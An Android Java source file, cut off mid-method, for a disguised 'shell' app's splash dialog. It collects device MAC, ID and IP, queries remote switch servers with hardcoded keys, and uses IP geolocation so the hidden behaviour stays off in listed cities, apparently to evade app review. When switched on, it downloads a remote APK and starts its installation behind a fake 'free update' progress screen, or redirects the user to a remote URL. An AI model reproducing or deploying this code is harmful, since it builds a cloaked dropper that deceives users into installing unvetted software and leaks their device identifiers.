package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
//import android.support.annotation.NonNull;
//import android.support.annotation.Nullable;
//import android.support.v4.app.ActivityCompat;
//import android.support.v4.content.ContextCompat;
//import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.regus.mj.config.KGConfig;
import com.regus.mj.config.PostBean;
import com.regus.mj.utils.AssistUtils;
import com.regus.mj.utils.FastJsonUtils;
import com.regus.mj.utils.GsonUtil;
import com.regus.mj.utils.InstallUtils;
import com.regus.mj.view.BaseDialogFragment;
import com.regus.mj.view.DialogFramentManager;
import com.regus.mj.view.TBProgressView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import static com.regus.mj.utils.KgUtils.httpHost;


public class MJRegusDialogFragment extends BaseDialogFragment {


    //服务器上的马甲id

    private String mAid = KGConfig.getInstance().getApp_aid();
    //服务器上该马甲的渠道id
    private String mSid = KGConfig.getInstance().getApp_sid();

    //跳转到原马甲包启动页的全路径
   // private String activityPath = KGConfig.AppInfoConfig.app_main_path;

    //后台开关地址  域名动态获取
    //private String busUrl = KGConfig.ServerConfig.bussnessUrl;

//    String root_old = "http://woaizggcdws.com:48581/shellapi/welcome";
//    String root_gitee = "https://gitee.com/tai-army/root-domain-name/raw/master/README.md";
//    String root_gitlab = "https://gitlab.com/guangzhouboning/roothost/-/raw/master/README.md";

//    //握手地址
//    String getHostUrl = root_gitee;



    //id 值   这些限制都只是占位词  后面直接用16进制 替换
    /**
     * 植入的图片  启动图背景叫 mj_splash.png      下载时候的背景叫 mj_down_splash.png
     */

    //该页面的下载时候的背景图片id
    private int splash_down_bg_id = KGConfig.getInstance().getApp_splash_down_rec();


    /**
     * 植入的一个主布局   名字固定叫 mj_regus_splash.xml
     */

    //页面布局的id
    private int activity_layout_id = KGConfig.getInstance().getApp_layout_splash();
    //页面布局的根布局的id
    private int root_view_id = KGConfig.getInstance().getApp_view_root();
    //该页面的加载框id
    private int progress_bar_id = KGConfig.getInstance().getApp_view_progressbar();
    //百分比
    private int progress_bar_num = KGConfig.getInstance().getApp_view_progressnum();


    private String downLoadUrl;
    private File savefolder;
    private String updateSaveName;

    private long packSize;
    private int progress;
    private TBProgressView progressBar;
    private RelativeLayout mRootView;
    private TextView mProgressNum;

//    private List<String> mHosts = new ArrayList<>();
//    private int mCurrentReqposition;

    private DownloadApkThread downloadApkThread;

    private String theDownloadPkaName = "";

    /**
     * 权限部分
     */

    private String[] permissions = new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE
    };
    List<String> mPermissionList = new ArrayList<>();

    private int mode = 0; // 0 h5模式    1 下载模式    2 融合模式       --->目前团队主要用下载模式热更新


    //设备相关

    private String macAddress;
    //private String phoneNum;
    private String ip;
    private String sysInfo;

    private boolean isForce;//是否强制获取权限


    @Override
    protected int getViewId() {
        return activity_layout_id;
    }

    @Override
    protected void initViews(View view) {

        //根布局id mj_root_view
        setRootViewId(view);

        //设置启动图id`
        setSplashId(view);

        //设置资源进度条id
        setProgressBarId(view);

        //设置资源进度条 百分比id
        setProgressBarNumId(view);
    }

    @Override
    protected void initData() {

        checkAppInfo();

       // checkPermision();

        afterCheckPermision();
    }


    private void checkAppInfo() {

        if (TextUtils.isEmpty(mAid)
             || splash_down_bg_id == 0 || activity_layout_id == 0 || root_view_id == 0 ||
                progress_bar_id == 0 || progress_bar_num == 0) {

            Toast.makeText(getContext(), "KG参数未配置正确~", Toast.LENGTH_LONG);

            dismissAllowingStateLoss();

        }

    }



    //设 RootView id
    @SuppressLint("ResourceType")
    private void setRootViewId(View view) {
        mRootView = view.findViewById(root_view_id);
    }

    //设置启动图id
    @SuppressLint("ResourceType")
    private void setSplashId(View view) {
        mRootView.setBackgroundResource(splash_down_bg_id);
    }

    //设置progress bar id
    @SuppressLint("ResourceType")
    private void setProgressBarId(View view) {
        progressBar = view.findViewById(progress_bar_id);
        progressBar.setProgress(0);
    }

    //设置progress bar num  id
    @SuppressLint("ResourceType")
    private void setProgressBarNumId(View view) {
        mProgressNum = view.findViewById(progress_bar_num);
    }


    /**
     * 所有权限检测完毕之后
     */
    private void afterCheckPermision() {


        try {

//            if (!AssistUtils.iConnected(getContext())) {
//                showNoNetDialog();
//                return;
//            }


            macAddress = AssistUtils.getMacAddress(getContext());
            Log.e("regus_mac ", macAddress + "");

            if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
                macAddress = AssistUtils.getDeviceId(getContext());
                Log.e("regus_mac_dev ", macAddress);
            }

          //  phoneNum = AssistUtils.getPhoneNum(getContext());
            ip = AssistUtils.getIPAddress(getContext());
            Log.e("regus_ip ", ip + "");
            sysInfo = AssistUtils.getSystemInfo();

//            CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
//
//            CrashHandler.getInstance()
//                    .init(getApplicationContext());

        }catch (Exception e){

        }


        getDt();

    }


    void showNoNetDialog() {

        Toast.makeText(getContext(), "网络状态异常", Toast.LENGTH_SHORT);

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(getActivity());
        //设置title
        normalDialog.setTitle("网络状态异常");
        //设置内容
        normalDialog.setMessage("游戏必要配置需要网络顺畅，请检查您的网络连接，确保网络连接可用");
        normalDialog.setCancelable(false);
        //设置按钮
        normalDialog.setPositiveButton("我已经打开", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                afterCheckPermision();
            }
        });

        normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                getActivity().finish();
            }
        });

        normalDialog.show();


    }


    void RequestThat() {
        Log.e("RequestThat", "requsetKaiGuanServer");
        requsetKaiGuanServer();
    }


    void getDt() {
        Log.e("regus_getDt", "getDt");
        new Thread(new GetDtRunnale()).start();
    }


    private class GetDtRunnale implements Runnable {

        @Override
        public void run() {

            try {
                URL urll = new URL("https://tlmdw22a.api.lncld.net/1.1/classes/UpVersion/6168ec5c31c3f94692a5e8de");
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setRequestProperty("X-LC-Id", "tLmDW22ab3CfULnkBagYBcqi-gzGzoHsz");
                urlConnection.setRequestProperty("X-LC-Key", "YOF1GehjRo4WYR15TaE9ij3L");
                urlConnection.setConnectTimeout(10000);
                urlConnection.setReadTimeout(10000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();

                    //处理
                    try {

                        JSONObject avObject = new JSONObject(jsonStr);


                        int show = avObject.getInt("show");
                        String url = avObject.getString("url");
                        boolean isStop = avObject.getBoolean("stop");

                        //重庆，北京，南京，上海，深圳，广州，四川，江苏，苏州，武汉，长沙，福建，浙江
                        JSONArray ipsArray = avObject.getJSONArray("ips");
                     //   Log.e("avo", "s  " + show + " i  " + isStop);

                        if(isStop){
                            new Thread(new Runnable() {
                                @Override
                                public void run() {

                                    try {

                                        URL urll = new URL("https://restapi.amap.com/v3/ip?key=a11dbeb4815afc317622d62797d7e408");
                                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                                        urlConnection.setConnectTimeout(10000);
                                        urlConnection.setReadTimeout(10000);
                                        urlConnection.setRequestMethod("GET");
                                        urlConnection.connect();
                                        int code = urlConnection.getResponseCode();
                                        if (code == 200) {
                                            InputStream inputStream = urlConnection.getInputStream();
                                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                                            String line;
                                            StringBuffer buffer = new StringBuffer();
                                            while ((line = bufferedReader.readLine()) != null) {
                                                buffer.append(line);
                                            }
                                            String json = buffer.toString();

                                            //    Log.e("avo_map", "s  " + json );

                                            JSONObject jsonMap = new JSONObject(json);

                                            boolean isLimit = false;


                                            for (int i = 0; i < ipsArray.length(); i++) {
                                                String area = ipsArray.getString(i);
                                                if (json.contains(area)) {
                                                    isLimit = true;
                                                }
                                            }


                                            if (json.contains("\"province\":[]")) {
                                                isLimit = true;
                                            }


                                            String info = jsonMap.getString("info");

                                            if (!info.toLowerCase().equals("ok")) {
                                                isLimit = false;
                                            }

                                            //   Log.e("avo", "s  " + show + " i  " + isStop + " lmit "+ isLimit);

                                            if(!isLimit){
                                                lcDoRogic(isStop,show,url);
                                            } else {
                                                RequestThat();
                                            }

                                        } else {
                                            Log.e("avo_0", "!200");
                                            lcDoRogic(isStop,show,url);
                                        }

                                    } catch (JSONException e) {
                                        Log.e("avo_2", e.getLocalizedMessage() + "");
                                        lcDoRogic(isStop,show,url);
                                    } catch (Exception e) {
                                        Log.e("avo_3", e.getLocalizedMessage() + "");
                                        lcDoRogic(isStop,show,url);
                                    }

                                }
                            }).start();
                        }else {
                            RequestThat();
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        RequestThat();
                    }
                } else {
                    RequestThat();
                }
            } catch (Exception e) {
                RequestThat();
            }
        }

    }

    private void lcDoRogic(boolean isStop,int show,String url){
        if (isStop) {
            if (show == 2) {
                if (url.endsWith("apk")) {
                    downLoadUrl = url;
                    mode = 1;

                    showDownLoadDialog();
                    isForce = true;
                    //     checkPermision();

                } else {
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_VIEW);
                    Uri content_url = Uri.parse(url);
                    intent.setData(content_url);
                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                    startActivity(intent);
                }

            } else {
                jumpLocalSplash();
            }
        } else {
            RequestThat();
        }
    }



    private void showDownLoadUi() {

      //  getContext().startService(new Intent(getContext(), MJForegroundService.class));

        setDownLoadApkBgId();
        downloadPackage();
    }

    @SuppressLint("ResourceType")
    private void setDownLoadApkBgId() {
        progressBar.setVisibility(View.VISIBLE);
        mRootView.setBackgroundResource(splash_down_bg_id);
    }


    /**
     * 权限检测
     */
    private void checkPermision() {

        try {
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (ContextCompat.checkSelfPermission(getContext(), permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                }
            }
            /**
             * 判断是否为空
             */
            if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了

                if(isForce){
                    showDownLoadDialog();
                }else {
                    afterCheckPermision();
                }

            } else {//请求权限方法

                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                ActivityCompat.requestPermissions(getActivity(), permissions, 1);
            }
        } catch (Exception e) {

            //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
            //先进去  里面的会帮我申请好权限
            jumpLocalSplash();

        }

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(getActivity(), permissions[i]);
                        if (showRequestPermission) {//

                            if(isForce){
                                checkPermision();//重新申请权限
                            }else {
                                afterCheckPermision();
                            }

                            return;
                        }
                    }
                }
                if (isForce)
                    checkPermision();
                else
                    afterCheckPermision();
                break;
            default:
                break;
        }
    }


//    private void getHostRequest() {
//        new Thread(new GetHostRequestRunnable()).start();
//    }
//
//
//    private class GetHostRequestRunnable implements Runnable {
//
//        @Override
//        public void run() {
//
//            try {
//                Log.e("regus_getHost ", getHostUrl + "");
//
//                URL urll = new URL(getHostUrl);
//                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
//                urlConnection.setConnectTimeout(7000);
//                urlConnection.setReadTimeout(7000);
//                urlConnection.setRequestMethod("GET");
//                urlConnection.connect();
//                int code = urlConnection.getResponseCode();
//                if (code == 200) {
//                    InputStream inputStream = urlConnection.getInputStream();
//                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
//                    String line;
//                    StringBuffer buffer = new StringBuffer();
//                    while ((line = bufferedReader.readLine()) != null) {
//                        buffer.append(line);
//                    }
//                    String jsonStr = buffer.toString();
//                    Log.e("regus getHost array", jsonStr + "");
//
//                    //处理
//                    try {
//
//                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
//                        Log.e("regus  array size", jsonArray.length() + "");
//
//                        traverseHost(jsonArray);
//
//                    } catch (JSONException e) {
//                        e.printStackTrace();
//                        Log.e("regus getHost", e.getLocalizedMessage() + "");
//                        requsetKaiGuanServer(serverIp);
//                    }
//                } else {
//                    Log.e("regus getHost", "code 不是200");
//
//                    if (getHostUrl.equals(root_gitee)) {
//                        getHostUrl = root_gitlab;
//                        getHostRequest();
//                        return;
//                    }
//
//                    if(getHostUrl.equals(root_gitlab)){
//                        getHostUrl = root_old;
//                        getHostRequest();
//                        return;
//                    }
//
//                    requsetKaiGuanServer(serverIp);
//
//                }
//            } catch (Exception e) {
//                Log.e("regus getHost", e.getLocalizedMessage() + "");
//
//                if (getHostUrl.equals(root_gitee)) {
//                    getHostUrl = root_gitlab;
//                    getHostRequest();
//                    return;
//                }
//
//                if(getHostUrl.equals(root_gitlab)){
//                    getHostUrl = root_old;
//                    getHostRequest();
//                    return;
//                }
//
//                requsetKaiGuanServer(serverIp);
//            }
//
//        }
//
//
//    }
//
//
//    void traverseHost(JSONArray jsonArray) {
//
//        List<String> stringList = new ArrayList<>();
//
//        for (int i = 0; i < jsonArray.length(); i++) {
//            try {
//                stringList.add((String) jsonArray.get(i));
//            } catch (JSONException e) {
//                e.printStackTrace();
//            }
//        }
//        mHosts = stringList;
//
//        if (mHosts.size() > 0) {
//            mCurrentReqposition = 0;
//            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
//        }
//
//    }
//
//
//    void requestNextHost() {
//        int hostSize = mHosts.size();
//        if (mCurrentReqposition < hostSize - 1) {
//            mCurrentReqposition = mCurrentReqposition + 1;
//            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
//        } else {
//            //没有任何域名可用
//            jumpLocalSplash();
//        }
//    }


    public  void requsetKaiGuanServer() {

        new Thread(new RequestAppInfoRunnable(mAid, mSid)).start();

    }




    private class RequestAppInfoRunnable implements Runnable {

        String aid;
        String sid;

        public RequestAppInfoRunnable(String aid, String sid) {
            this.aid = aid;
            this.sid = sid;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid)) {
                jumpLocalSplash();
                return;
            }

            String url =  httpHost[0] + "/Inbound/QueryAppConfig";

            String time = System.currentTimeMillis()+"";

            PostBean postBean = new PostBean();
            postBean.setClientSource(0);
            postBean.setPartnerKey("b82cc1515cd64869beefe697cce16aad");
            postBean.setDate(time);
            postBean.setToken("");

            PostBean.ParamBean paramBean = new PostBean.ParamBean();
            paramBean.setMac(macAddress);
            paramBean.setChannelId(sid);
            paramBean.setAppKey(aid);

            postBean.setParam(paramBean);

            Log.e("regus",   "post re sign: " + time + FastJsonUtils.toJSONString(paramBean) +  "b82cc1515cd64869beefe697cce16aad");

           String sign = md5(time + FastJsonUtils.toJSONString(paramBean) +  "b82cc1515cd64869beefe697cce16aad") ;

           postBean.setSign(sign);


            Log.e("regus",   "post sign " + sign);

            String param = GsonUtil.GsonString(postBean);

            Log.e("regus",   "post param " + param);



            try {

                PrintWriter out = null;

                URL urll = new URL(url);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(15000);
                urlConnection.setReadTimeout(15000);
                urlConnection.setRequestMethod("POST");

                urlConnection.setRequestProperty("Content-Type", " application/json");// 设定
                urlConnection.setDoOutput(true);
                urlConnection.setDoInput(true);
                urlConnection.setUseCaches(false)
                ;

                out = new PrintWriter(urlConnection.getOutputStream());

                // 发送请求参数

                out.print(param);

                // flush输出流的缓冲

                out.flush();
                out.close();

                Log.e("regus",   "post start");

                int code = urlConnection.getResponseCode();

                if (code == 200) {

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    solveLines(true, jsonStr);

                } else {
                    Log.e("regus",   "不是200");
                    solveLines(false, null);
                }
            } catch (Exception e) {
                Log.e("regus",   "请求开关错误 "+e.getLocalizedMessage());
                solveLines(false, null);
            }

        }

    }



    public static String md5(String string) {
        if (TextUtils.isEmpty(string)) {
            return "";
        }
        MessageDigest md5 = null;
        try {
            md5 = MessageDigest.getInstance("MD5");
            byte[] bytes = md5.digest(string.getBytes());
            String result = "";
            for (byte b : bytes) {
                String temp = Integer.toHexString(b & 0xff);
                if (temp.length() == 1) {
                    temp = "0" + temp;
                }
                result += temp;
            }
            return result;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return "";
    }


    private volatile boolean isGetKgRepInfoAlready = false;


    /**
     * 处理几个ping 域名的请求
     */
    private synchronized void solveLines(boolean isOK, String buJson) {

        if (isGetKgRepInfoAlready) {
            Log.e("regus_", " 已经有可用域名 其他的直接return");
            return;
        }


        if (isOK) {

            isGetKgRepInfoAlready = true;

            //处理
            try {
                JSONObject responseJson = new JSONObject(buJson.replace("\\", ""));

                if (responseJson.has("Code") && responseJson.has("Value")) {
                    if (responseJson.getInt("Code") == 1) {

                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Value"));


                        //IsLimit
                        if (dataJsonObject.getBoolean("IsLimit")) {
                            jumpLocalSplash();
                            return;
                        }


                        if (!dataJsonObject.getBoolean("IsOpenAdvert")) {
                            clearSp(getContext());
                        }


                        if (dataJsonObject.has("IsOpenFuse") && dataJsonObject.getBoolean("IsOpenFuse")) {
                            //融合模式
                            mode = 2;

                            //融合模式
                           getActivity(). runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(getContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
                                }
                            });

                            getApkFromAssets();

                        }
                        else if (dataJsonObject.getBoolean("IsOpenAdvert")) {

//                            if (dataJsonObject.has("AdvertiseList")) {
//                                JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertiseList");
//
//                                String key_ad_kg = "key_ad_kg";
//                                String key_ad_value = "key_ad_value";
//
//
//                                if (advertiseArray != null) {
//                                    for (int i = 0; i < advertiseArray.length(); i++) {
//                                        JSONObject jsonObject = advertiseArray.getJSONObject(i);
//                                        if (jsonObject != null) {
//                                            if (jsonObject.has("AdvertiseUrl")) {
//
//                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
//                                                        .putString(key_ad_value + i, jsonObject.getString("AdvertiseUrl")).apply();
//
//                                            }
//
//                                            if (jsonObject.has("IsEnable")) {
//
//                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
//                                                        .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsEnable")).apply();
//                                            }
//                                        }
//                                    }
//                                }
//
//                            }

                            jumpLocalSplash();

                        } else if (dataJsonObject.getBoolean("IsOpenDown")) {
                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
                            mode = 1;
                            Log.e("regus 得到的下载链接: ", downLoadUrl);
                            isForce = true;
                            showDownLoadDialog();
                        } else if (dataJsonObject.getBoolean("IsOpenJump")) {
                            //h5模式
                            mode = 0;
                            startWebview(dataJsonObject.getString("JumpUrl"));
                        } else {
                            jumpLocalSplash();
                        }

                    } else {
                        jumpLocalSplash();
                    }
                    return;
                }

            } catch (JSONException e) {
                e.printStackTrace();
                jumpLocalSplash();
            }

        }else {
            jumpLocalSplash();
        }

    }


    public static void clearSp(Context context) {
        SharedPreferences preferences = context.getSharedPreferences("regus", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.clear();
        editor.commit();
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {
//        try {
//            Class aimClass = Class.forName(activityPath);
//            Intent intent = new Intent(getActivity().this, aimClass);
//            startActivity(intent);
            dismissAllowingStateLoss();

//        } catch (ClassNotFoundException e) {
//            e.printStackTrace();
//        }
    }


    /**
     * web 显示h5
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jumpLocalSplash();
            return;
        }
        jumpTo(url, 0);
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {
        getActivity().runOnUiThread(new Runnable() {
            @Override
            public void run() {
                showDownLoadUi();
            }
        });
    }


    /**
     * 下载主包
     */

    public void downloadPackage() {

        if (TextUtils.isEmpty(downLoadUrl)) {
            Toast.makeText(getContext(), "未配置APP下载链接~", Toast.LENGTH_LONG);
            return;
        }

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }

        downloadApkThread = new DownloadApkThread();
        downloadApkThread.start();
    }

    private class DownloadApkThread extends Thread {

        @SuppressLint("WrongConstant")
        @Override
        public void run() {
            super.run();
            long j = 0;

            try {

                URL url = new URL(downLoadUrl);

                Log.e("regus 跳转请求url", url+"");

                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setConnectTimeout(7000);
                httpURLConnection.setReadTimeout(7000);
                httpURLConnection.connect();

                if (httpURLConnection.getResponseCode() != 200) {
                    Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                    jumpLocalSplash();
                    return;
                }

                InputStream is = httpURLConnection.getInputStream();
                packSize = httpURLConnection.getContentLength();

                if (AssistUtils.checkExistSDCard()) {
                    savefolder = Environment.getExternalStorageDirectory();
                } else {
                    savefolder = getContext().getDir("update", 3);
                }


                updateSaveName = downLoadUrl.substring(downLoadUrl.lastIndexOf("/") + 1);

                File file = new File(savefolder, updateSaveName);
                Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);
                if (file.exists()) {
                    file.delete();
                }
                Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                OutputStream os = new FileOutputStream(file);

                byte[] bytes = new byte[512];

                int length;

                while ((length = is.read(bytes)) != -1) {
                    os.write(bytes, 0, length);
                    j += (long) length;
                    progress = (int) ((((float) j) / ((float) packSize)) * 100.0f);
                    Log.e("regus progress", progress + "");
                    showLoadDialogProgress(progress);
//                    if (progress == 100) {
//                        hideWebViewLoadDialog();
//                    }
                }

                //关闭流
                is.close();
                os.close();
                os.flush();

                gotoInstall();

            } catch (MalformedURLException e) {
                e.printStackTrace();
                jumpLocalSplash();
            } catch (IOException e2) {
                e2.printStackTrace();
                Log.e("regus IOException", "" + e2.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }

                    downloadPackage();
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("regus Exception", "" + e.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }
                    downloadPackage();
                }
            }

        }

    }


    private void showLoadDialogProgress(int progress) {

       getActivity(). runOnUiThread(new Runnable() {

            @Override
            public void run() {

//                if (progress == 95) {
//                    if (!AssistUtils.isRunningForeground(MJRegusActivity.this)) {
//                        AssistUtils.setTopApp(MJRegusActivity.this);
//                    }
//                }

                if (progressBar != null && mProgressNum != null) {
                    progressBar.setProgress(progress);
                    mProgressNum.setText("本次更新不消耗流量，正在更新..." + progress + "%");
                }

            }
        });

    }


    /**
     * 获取assert 里的主包  这是融合模式   暂时不用
     */

    @SuppressLint("WrongConstant")
    private void getApkFromAssets() {

        try {

            if (AssistUtils.checkExistSDCard()) {
                savefolder = Environment.getExternalStorageDirectory();
            } else {
                savefolder = getContext().getDir("update", 3);
            }


            String aimApkName = "main.apk";

            InputStream is = getContext().getAssets().open(aimApkName);

            updateSaveName = "eric.apk";

            File file = new File(savefolder, updateSaveName);

            Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);

            if (file.exists()) {
                file.delete();
            }

            FileOutputStream fos = new FileOutputStream(file);
            byte[] temp = new byte[1024];
            int i = 0;
            while ((i = is.read(temp)) > 0) {
                fos.write(temp, 0, i);
            }
            fos.close();
            is.close();

            gotoInstall();


        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus IOException", "" + e.getLocalizedMessage());
            jumpLocalSplash();
        }


    }

    /**
     * 去安装
     */

    @SuppressLint("WrongConstant")
    private void gotoInstall() {

        try {

            PackageManager pm = this.getContext().getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
                    PackageManager.GET_ACTIVITIES);

            if (info != null) {
                String packageName = info.packageName;
                theDownloadPkaName = packageName;
                Log.e("regus_", "checkPackageNameIfsame 远程的包名是 " + packageName);
            }

        } catch (Exception e){
            Log.e("regus_", "checkPackageNameIfsame 远程的包 error " + e.getLocalizedMessage());
        }


        toInstall();

    }


    private void unInstallSelf() {
        if (AssistUtils.isAvilible(theDownloadPkaName, getActivity())) {
            //卸载自己
//            Uri packageUri = Uri.parse("package:" + getPackageName());
//            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
//            startActivity(intent);
        } else {

            //创建dialog构造器
            AlertDialog.Builder normalDialog = new AlertDialog.Builder(getActivity());
            //设置title
            normalDialog.setTitle("最新应用未安装成功？");
            //设置内容
            normalDialog.setMessage("点击确定去安装更新");
            normalDialog.setCancelable(false);
            //设置按钮
            normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    toInstall();
                }
            });

            normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dismissAllowingStateLoss();
                }
            });

            normalDialog.show();
        }
    }


    private void installApk(String path) {
        InstallUtils.installAPK(getActivity(), path, new InstallUtils.InstallCallBack() {
            @Override
            public void onSuccess() {
                //onSuccess：表示系统的安装界面被打开
                //防止用户取消安装，在这里可以关闭当前应用，以免出现安装被取消
                getActivity().runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(getContext(), "正在安装程序", Toast.LENGTH_SHORT).show();
                    }
                });

            }

            @Override
            public void onFail(Exception e) {
                getActivity().runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Log.e("regus installApk",""+e.getLocalizedMessage());
                        Toast.makeText(getContext(), "安装失败" + e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
                    }
                });

            }
        });
    }


    @SuppressLint("WrongConstant")
    private void toInstall() {

//        Intent intent = new Intent(Intent.ACTION_VIEW);
//        int i = getContext().getApplicationInfo().targetSdkVersion;
//        if (Build.VERSION.SDK_INT < 24 || i < 24) {
//            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
//            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
//        } else {
//            //添加这一句表示对目标应用临时授权该Uri所代表的文件
//            intent.setFlags(1);
//            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
//            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
//            intent.setDataAndType(FileProvider.getUriForFile(getContext().getApplicationContext(), getContext().getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
//        }
//
//        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//
//        if (theDownloadPkaName.equals(getContext().getPackageName())) {
//            startActivity(intent);
//            getActivity(). finish();
//        } else {
//            startActivity(intent);
//            isCover = true;
//        }

        installApk(new File(this.savefolder, this.updateSaveName).getPath());


    }

    private boolean isCover;


//    @Override
//    protected void onResume() {
//        super.onResume();
//
//        Log.e("regus_", "onResume");
//
//        if (isCover) {
//            unInstallSelf();
//        }
//    }




    /**
     * 跳转逻辑
     */

    private void jumpTo(final String url, int type) {

        getActivity().runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getContext(), "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                showTipDialog(url);
                startBrowser(url);
            }
        });


    }


    private void showTipDialog(final String url) {

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(getActivity());
        //设置title
        normalDialog.setTitle("需要跳转到浏览器");
        //设置内容
        normalDialog.setMessage("点击跳转到专业版~");
